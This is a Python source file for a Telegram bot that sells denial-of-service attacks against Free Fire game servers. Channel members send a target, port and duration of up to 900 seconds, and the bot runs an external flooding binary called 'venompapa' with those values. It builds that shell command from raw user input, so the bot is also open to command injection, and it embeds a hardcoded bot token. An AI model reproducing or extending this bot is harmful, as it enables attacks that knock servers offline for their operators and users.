#!/usr/bin/python3

import telebot
import subprocess

# Insert your Telegram bot token here
bot = telebot.TeleBot('7799076324:AAFwRtXhfEi6nOPwnSTRpcMtHcxM3NqYq74')  # Replace YOUR_BOT_TOKEN with your actual bot token

# Admin user IDs
admin_id = ["7530806675"]

# File to store command logs
LOG_FILE = "log.txt"

# Replace with your private channel ID
PRIVATE_CHANNEL_ID = -1002487608010  # Replace with the actual private channel ID

# Function to log commands
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to verify if a user is a member of the private channel
def is_channel_member(user_id):
    try:
        member_status = bot.get_chat_member(PRIVATE_CHANNEL_ID, user_id).status
        return member_status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException:
        return False

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = '''🤖 Welcome!⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀FREEFIRE
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

🤖Try To Run This Command : /help 
Try these commands:
✅ /help: Show help
✅ Join :- https://t.me/+E9wRqB1L4MMxMTE1
🌟Contact Owner :- @raj_magic
Join our private channel for access!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['ffindia'])
def handle_ffindia(message):
    user_id = message.from_user.id
    response = None  # Initialize the response variable
    
    if is_channel_member(user_id):
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 900:
                response = "❌ Error: Time interval must be less than or equal to 900 seconds."
            else:
                log_command(user_id, target, port, time)
                full_command = f"./venompapa {target} {port} {time} 200"
                
                # Updated reply format for successful attack start
                bot.reply_to(message, f"✅ FreeFire attack started successfully!\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nCredit: @raj_magic")
                
                # Run the attack command
                subprocess.run(full_command, shell=True)
                
                # Send a finished message after execution
                bot.reply_to(message, "✅ Attack finished successfully.")
        else:
            response = "🌟 Usage: /ffindia <target> <port> <time>"
    else:
        # Message for users not in the private channel
        response = "❌ You must join our private channel to access this feature. Use this link to join:\nhttps://t.me/+E9wRqB1L4MMxMTE1"
    
    # Send response if it exists
    if response:
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"Your Telegram ID is: {user_id}")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 Available commands:
💥 /ffindia <target> <port> <time>: Start an attack.
💥 /id: Get your Telegram ID.
💥 /rules: View usage rules.
💥 /help: Show this help message.

Join our private channel: https://t.me/+E9wRqB1L4MMxMTE1
Contact admin: @raj_magic
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = '''⚠️ Please follow these rules:
1. Do not run multiple attacks simultaneously.
2. Respect the cooldown period between commands.
3. Use your main Telegram ID for security.
4. Follow our channel for updates: https://t.me/+E9wRqB1L4MMxMTE1
'''
    bot.reply_to(message, response)

# Polling for updates
bot.polling()
